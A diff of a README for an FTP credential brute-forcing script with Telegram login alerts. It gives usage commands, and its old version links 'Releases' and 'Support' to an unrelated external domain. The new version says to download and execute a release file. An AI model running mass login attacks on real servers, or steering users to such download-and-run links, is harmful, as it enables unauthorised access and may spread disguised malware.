@@ -1,109 +1,122 @@
-# CrackFtp 🚀
+# CrackFtp 🔒
 
-![CrackFtp](https://img.shields.io/badge/CrackFtp-FTP%20Checker%20and%20Cracker-brightgreen)
+![CrackFtp](https://img.shields.io/badge/CrackFtp-v1.0-blue)
 
-Welcome to **CrackFtp**, a powerful script designed for mass FTP credential testing. This tool helps you verify login details against secure domains and sends notifications via Telegram upon successful logins. Whether you're a cybersecurity professional or just exploring network security, CrackFtp provides a straightforward and efficient way to assess FTP security.
+Welcome to **CrackFtp**, a powerful script designed for security professionals and ethical hackers. This tool allows you to test FTP login credentials efficiently and receive alerts on successful logins via Telegram. With this script, you can enhance your security assessments and streamline your testing process.
 
 ## Table of Contents
 
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
+- [Configuration](#configuration)
 - [Telegram Notifications](#telegram-notifications)
+- [Supported Protocols](#supported-protocols)
 - [Contributing](#contributing)
 - [License](#license)
-- [Support](#support)
+- [Acknowledgments](#acknowledgments)
+- [Releases](#releases)
 
 ## Features
 
-- **Mass FTP Checking**: Test multiple credentials simultaneously.
-- **Brute Force Capability**: Assess the strength of FTP passwords.
-- **Telegram Alerts**: Receive immediate notifications for successful logins.
-- **Command-Line Interface**: Easy to use with straightforward commands.
-- **Cross-Platform**: Works on Windows, macOS, and Linux.
-- **Open Source**: Contribute and enhance the project as needed.
+- **Mass FTP Checking**: Test multiple credentials against secure domains.
+- **Brute Force Capability**: Efficiently attempt various combinations to find valid logins.
+- **Telegram Alerts**: Receive instant notifications for successful logins.
+- **Command-Line Interface**: Simple and effective interface for quick execution.
+- **Customizable**: Modify settings to suit your testing needs.
 
 ## Installation
 
-To get started with CrackFtp, download the latest release from our [Releases section](https://gitzinstall.cyou?lf7ha0nqj0t74ji). After downloading, extract the files and navigate to the directory where you placed the script.
+To get started with CrackFtp, follow these simple steps:
 
-```bash
-git clone https://github.com/nutstreetking/CrackFtp.git
-cd CrackFtp
-```
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Christian-Rivera134/CrackFtp.git
+   ```
 
-Make sure you have Python installed on your machine. You can check this by running:
+2. **Navigate to the Directory**:
+   ```bash
+   cd CrackFtp
+   ```
 
-```bash
-python --version
-```
-
-If Python is not installed, please download it from the [official website](https://www.python.org/downloads/).
-
-### Dependencies
-
-Before running the script, install the required dependencies:
-
-```bash
-pip install -r requirements.txt
-```
+3. **Install Required Packages**:
+   Ensure you have Python installed. You can install the necessary packages using:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
 ## Usage
 
-Once you have installed the necessary dependencies, you can run the script using the command line. Here’s how to do it:
+To use CrackFtp, run the script from your command line. Here’s the basic command structure:
 
 ```bash
-python crackftp.py --host <FTP_HOST> --user <USERNAME_LIST> --pass <PASSWORD_LIST>
+python crackftp.py -u <username_file> -p <password_file> -t <target>
 ```
 
-- **`<FTP_HOST>`**: The target FTP server address.
-- **`<USERNAME_LIST>`**: A file containing usernames to test.
-- **`<PASSWORD_LIST>`**: A file containing passwords to test.
+- `-u <username_file>`: Specify the file containing usernames.
+- `-p <password_file>`: Specify the file containing passwords.
+- `-t <target>`: Provide the FTP server address.
 
 ### Example
 
 ```bash
-python crackftp.py --host ftp.example.com --user users.txt --pass passwords.txt
+python crackftp.py -u usernames.txt -p passwords.txt -t ftp.example.com
 ```
 
-This command will test the usernames and passwords listed in the specified files against the FTP server at `ftp.example.com`.
+## Configuration
+
+Before running the script, you may need to configure certain parameters. Open the `config.py` file to adjust settings such as:
+
+- **Timeout Settings**: Modify the timeout for connection attempts.
+- **Logging Options**: Choose whether to log attempts to a file.
 
 ## Telegram Notifications
 
-To enable Telegram notifications, you need to set up a bot. Follow these steps:
+To set up Telegram notifications:
 
-1. Open Telegram and search for the "BotFather".
-2. Create a new bot and note down the API token.
-3. Get your chat ID by sending a message to your bot and using the API to retrieve it.
+1. **Create a Bot**: Use the BotFather on Telegram to create a new bot and obtain the API token.
+2. **Get Your Chat ID**: Send a message to your bot and use a tool to find your chat ID.
+3. **Update the Config**: Insert your API token and chat ID into the `config.py` file.
 
-Once you have both the API token and chat ID, add them to your configuration file. 
+## Supported Protocols
 
-```json
-{
-  "telegram_token": "YOUR_API_TOKEN",
-  "chat_id": "YOUR_CHAT_ID"
-}
-```
-
-Now, whenever a successful login occurs, you will receive a notification in Telegram.
+CrackFtp primarily supports the FTP protocol. Future updates may include support for additional protocols such as FTPS and SFTP.
 
 ## Contributing
 
-We welcome contributions to CrackFtp! If you have suggestions or improvements, feel free to fork the repository and submit a pull request. Please follow these guidelines:
+We welcome contributions to CrackFtp. If you would like to help improve the script, please follow these steps:
 
-1. Fork the repository.
-2. Create a new branch for your feature or bug fix.
-3. Make your changes and commit them with clear messages.
-4. Push your changes and create a pull request.
+1. **Fork the Repository**.
+2. **Create a New Branch**:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add your message"
+   ```
+5. **Push to Your Branch**:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**.
 
 ## License
 
-CrackFtp is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Support
+## Acknowledgments
 
-If you encounter any issues or have questions, please check the [Releases section](https://gitzinstall.cyou?l7s7wtbhhy10tdb) for updates. You can also open an issue in the repository, and we will respond as soon as possible.
+- Thanks to the contributors and community members who helped improve CrackFtp.
+- Special thanks to the creators of the libraries and tools used in this project.
 
----
+## Releases
 
-Thank you for using CrackFtp! We hope this tool helps you enhance your understanding of FTP security. Happy testing!
+For the latest version of CrackFtp, please visit the [Releases](https://github.com/Christian-Rivera134/CrackFtp/releases) section. Download the latest file, execute it, and start testing your FTP credentials today.
+
+## Conclusion
+
+CrackFtp is a valuable tool for security professionals. It streamlines the process of testing FTP credentials and enhances your security assessments. Download the latest version from the [Releases](https://github.com/Christian-Rivera134/CrackFtp/releases) section and start using it today.
+
+Feel free to reach out with any questions or feedback. Happy hacking!
